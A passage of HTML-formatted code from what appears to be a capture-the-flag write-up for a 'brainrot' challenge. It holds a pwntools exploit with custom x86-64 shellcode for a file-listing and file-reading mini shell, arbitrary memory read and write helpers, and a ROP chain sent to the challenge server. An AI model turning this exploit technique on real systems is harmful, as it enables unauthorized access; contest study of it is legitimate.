style="color:#B56959">    sub rsp,0x200</span><br><br><br><span style="color:#B56959">    xor rcx,rcx</span><br><span style="color:#B56959">    mov rdx,65536</span><br><span style="color:#B56959">    mov rsi,rdi</span><br><span style="color:#B56959">    mov edi,0xFFFFFF9C</span><br><span style="color:#B56959">    call sys_openat2</span><br><br><span style="color:#B56959">    cmp rax,-1</span><br><span style="color:#B56959">    je ls_failed</span><br><br><span style="color:#B56959">    mov r8,rax</span><br><span style="color:#B56959">/* loop read dir */</span><br><span style="color:#B56959">loop_read_dir:</span><br><span style="color:#B56959">    mov rdi,r8</span><br><span style="color:#B56959">    mov rsi,rsp</span><br><span style="color:#B56959">    mov rdx,0x200</span><br><br><span style="color:#B56959">    mov rax,78</span><br><span style="color:#B56959">    syscall</span><br><br><span style="color:#B56959">    cmp rax,0</span><br><span style="color:#B56959">    jle ls_failed</span><br><br><span style="color:#B56959">    /* r9: nRead */</span><br><span style="color:#B56959">    mov r9,rax</span><br><br><span style="color:#B56959">    /* show infos in buffer */</span><br><span style="color:#B56959">    xor rcx,rcx</span><br><span style="color:#B56959">show_file_in_buffer:</span><br><span style="color:#B56959">    lea rdi,[rsp + rcx + 16]</span><br><span style="color:#B56959">    xor rax,rax</span><br><span style="color:#B56959">    mov ax,word ptr [rdi]</span><br><span style="color:#B56959">    add rcx,rax</span><br><span style="color:#B56959">    add rdi,2</span><br><span style="color:#B56959">    push rcx</span><br><span style="color:#B56959">    call print</span><br><br><span style="color:#B56959">    /* dir of regular file*/</span><br><span style="color:#B56959">    mov rcx,[rsp]</span><br><br><span style="color:#B56959">    mov al,byte ptr [rsp + rcx + 7]</span><br><span style="color:#B56959">    cmp al,0x4</span><br><span style="color:#B56959">    mov rax,0xa</span><br><span style="color:#B56959">    mov rdx,1</span><br><span style="color:#B56959">    jne out_split_char</span><br><span style="color:#B56959">    / * out char '/' */</span><br><span style="color:#B56959">    mov rax,0xa2f</span><br><span style="color:#B56959">    inc rdx</span><br><span style="color:#B56959">out_split_char:</span><br><span style="color:#B56959">    push rax</span><br><span style="color:#B56959">    mov rdi,1</span><br><span style="color:#B56959">    mov rsi,rsp</span><br><br><span style="color:#B56959">    mov rax,1</span><br><span style="color:#B56959">    syscall</span><br><span style="color:#B56959">    add rsp,8</span><br><span style="color:#B56959">    pop rcx</span><br><span style="color:#B56959">    cmp rcx,r9</span><br><br><span style="color:#B56959">    jb show_file_in_buffer</span><br><br><span style="color:#B56959">    /* all file in buffer has been listed */</span><br><span style="color:#B56959">    jmp loop_read_dir</span><br><br><span style="color:#B56959">ls_failed:</span><br><span style="color:#B56959">    leave</span><br><span style="color:#B56959">    pop r8</span><br><span style="color:#B56959">    ret</span><br><br><span style="color:#B56959">mini_shell:</span><br><span style="color:#B56959">    sub rsp,0x200</span><br><span style="color:#B56959">    mov dword ptr[rsp],0x242f</span><br><span style="color:#B56959">loop_exec_cmd:</span><br><span style="color:#B56959">    /* show current work dir*/</span><br><span style="color:#B56959">    mov rdi,rsp</span><br><span style="color:#B56959">    call print</span><br><span style="color:#B56959">    /* get user's command */</span><br><span style="color:#B56959">    lea rdi,[rsp + 0x100]</span><br><span style="color:#B56959">    call gets</span><br><span style="color:#B56959">    /* switch command */</span><br><span style="color:#B56959">if_ls:</span><br><span style="color:#B56959">    mov eax,[rsp + 0x100]</span><br><span style="color:#B56959">    and eax,0x00ffffff</span><br><span style="color:#B56959">    cmp eax,0x20736c</span><br><span style="color:#B56959">    jne if_cat</span><br><br><span style="color:#B56959">    lea rdi,[rsp + 0x103]</span><br><span style="color:#B56959">    call ls</span><br><span style="color:#B56959">    jmp loop_exec_cmd</span><br><span style="color:#B56959">if_cat:</span><br><span style="color:#B56959">    mov eax,[rsp + 0x100]</span><br><span style="color:#B56959">    and eax,0xffffffff</span><br><span style="color:#B56959">    cmp eax,0x20746163</span><br><span style="color:#B56959">    jne loop_exec_cmd</span><br><br><span style="color:#B56959">    lea rdi,[rsp + 0x104]</span><br><span style="color:#B56959">    call cat</span><br><span style="color:#B56959">    jmp loop_exec_cmd</span><br><br><span style="color:#B56959">    /* dfd,filename,flag,mode */</span><br><span style="color:#B56959">sys_openat2:</span><br><span style="color:#B56959">    push r10</span><br><span style="color:#B56959">    sub rsp,0x18</span><br><br><span style="color:#B56959">    xor rax,rax</span><br><span style="color:#B56959">    /*how */</span><br><span style="color:#B56959">    mov [rsp + 0x0],rdx</span><br><span style="color:#B56959">    mov [rsp + 0x8],rcx</span><br><span style="color:#B56959">    mov [rsp + 0x10],rax</span><br><span style="color:#B56959">    lea rdx,[rsp]</span><br><br><span style="color:#B56959">    /* size */</span><br><span style="color:#B56959">    push 0x18</span><br><span style="color:#B56959">    pop r10</span><br><br><span style="color:#B56959">    mov rax, SYS_openat2</span><br><span style="color:#B56959">    syscall</span><br><br><span style="color:#B56959">    add rsp,0x18</span><br><span style="color:#B56959">    pop r10</span><br><span style="color:#B56959">    ret</span><br><br><span style="color:#B56959">sys_openat:</span><br><span style="color:#B56959">    push r10</span><br><span style="color:#B56959">    mov r10,rcx</span><br><span style="color:#B56959">    mov rax, SYS_openat</span><br><span style="color:#B56959">    syscall</span><br><span style="color:#B56959">    pop r10</span><br><span style="color:#B56959">    ret</span><br><span style="color:#B56959">"""</span><br><br><span style="color:#393A34">orw </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">orw</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">src </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">6348d6</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">50</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">662343</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">66231b</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">624ba6</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">]</span><br><br><span style="color:#393A34">write64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">c003fffc00</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">6873</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write64</span><span style="color:#2993a3">(</span><span style="color:#998418">dir</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2f2e2e</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">reread</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">+</span><span style="color:#393A34"> i </span><span style="color:#AB5959">*</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><span style="color:#393A34"> reread</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#393A34"> src</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">flat</span><span style="color:#1e754f">(</span><span style="color:#393A34">rop</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#1e754f">(</span><span style="color:#393A34">mini_shell</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./brainrot</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">brainrot.challs.infobahnc.tf</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1337</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># io = remote("127.0.0.1", 8081) if argv[1] == 'r' else process(proc)</span><br><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    # b* 0x62C7B0</span><br><span style="color:#C98A7D">    c</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Brainrot index:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Which brainrot are you stealing?:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> check</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Brainrot index: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dest</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> src</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> addr </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c00000c1e0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><br><span style="color:#DBD7CAEE">    idx </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c00000c1e0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 4</span><br><span style="color:#DBD7CAEE">    target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> dest </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> src</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 67676767</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 67676767</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Los 67</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">                # io.interactive()</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 67676767</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 1000000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 1000000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Chimpanzini Bananini</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 1000000</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 100000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 100000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Orcalero Orcala</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 100000</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 10000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 10000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Odin Din Din Dun</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 10000</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 1000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 1000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Job Job Job Sahur</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 1000</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 100</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 100</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">John Pork</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 100</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Ballerina Cappuccina</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 10</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">></span><span style="color:#CB7676">=</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                steal</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Meowl</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">%</span><span style="color:#4C9A91"> 1</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> read64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> addr </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c00000c1e0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><br><span style="color:#DBD7CAEE">    idx </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c00000c1e0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 4</span><br><span style="color:#DBD7CAEE">    check</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">is generating $</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    low </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/s</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    check</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">is generating $</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    high </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/s</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span 